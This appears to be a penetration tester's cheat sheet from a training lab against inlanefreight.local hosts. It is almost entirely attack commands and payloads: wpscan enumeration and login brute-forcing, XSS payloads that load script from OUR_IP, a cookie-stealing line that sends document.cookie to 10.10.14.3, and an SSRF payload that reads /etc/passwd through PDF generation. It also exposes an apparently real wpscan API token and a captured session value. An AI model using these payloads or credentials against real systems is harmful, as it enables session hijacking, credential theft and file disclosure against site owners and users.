# Drupal
```
curl -s http://blog.inlanefreight.local | grep Drupal
```
### Droopscan
```
droopescan scan drupal -u http://blog.inlanefreight.local/
```
# Word Press
```
wpscan --url http://ir.inlanefreight.local/ --api-token 51vO4v72sy7CxiqSaaIMsSH6V6SHKlPNmrmg7vcydB8 -e ap -t 500 -t 64
```
```
wpscan --url http://ir.inlanefreight.local/ --api-token 51vO4v72sy7CxiqSaaIMsSH6V6SHKlPNmrmg7vcydB8 -e at,ap --plugins-detection mixed -t 64
```
### WP User
```
wpscan -e u -t 500 --url http://ir.inlanefreight.local
```
### WP User Login Bruteforce
```
wpscan --url http://ir.inlanefreight.local -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt -U ilfreightwp
```
# XXS
### Sesson HiJacking
```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
for cookie
```
"><script>new Image().src='http://10.10.14.3/index.php?c='+document.cookie</script>
```
Then add the cookie to the cookie plugin

```
session
fcfaf93ab169bc943b92109f0a845d99
```
# SSRF
https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
Look at exploiting PDF file

### Payload
```
<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
  ```
  
